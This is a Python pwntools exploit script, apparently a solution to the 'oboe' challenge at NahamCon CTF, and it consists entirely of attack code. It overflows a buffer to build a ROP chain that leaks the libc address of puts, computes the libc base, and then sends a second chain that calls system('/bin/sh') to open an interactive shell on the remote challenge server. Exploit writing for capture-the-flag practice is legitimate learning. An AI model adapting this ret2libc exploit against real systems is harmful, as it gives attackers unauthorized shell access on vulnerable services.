from pwn import *
import sys

context.terminal = "tmux splitw -h".split()
context.binary = elf = ELF('oboe')
#p = elf.process()
p = remote('challenge.nahamcon.com', int(sys.argv[1]))
libc = elf.libc
gdbs = """
b * build+312
"""
#gdb.attach(p,gdbs)
ret = 0x804819b
main = 0x80486f5
p.sendline(cyclic(200))
p.sendline(cyclic(200))
p.sendline(cyclic(6) + p32(elf.sym.puts) + p32(main) +p32(elf.got.puts)+ p32(ret) +b'A' * 11)

for i in range(6):
    p.recvline()

libc.address = unpack(p.recvn(4),'all') - libc.sym.puts
print(hex(libc.address))

rop = ROP(libc)
rop.call(rop.ret)
rop.system(libc.search(b'/bin/sh\x00').__next__())
p.sendline(cyclic(84))
p.sendline(cyclic(84))
p.sendline(rop.chain() + b'x' * 20)
p.interactive()
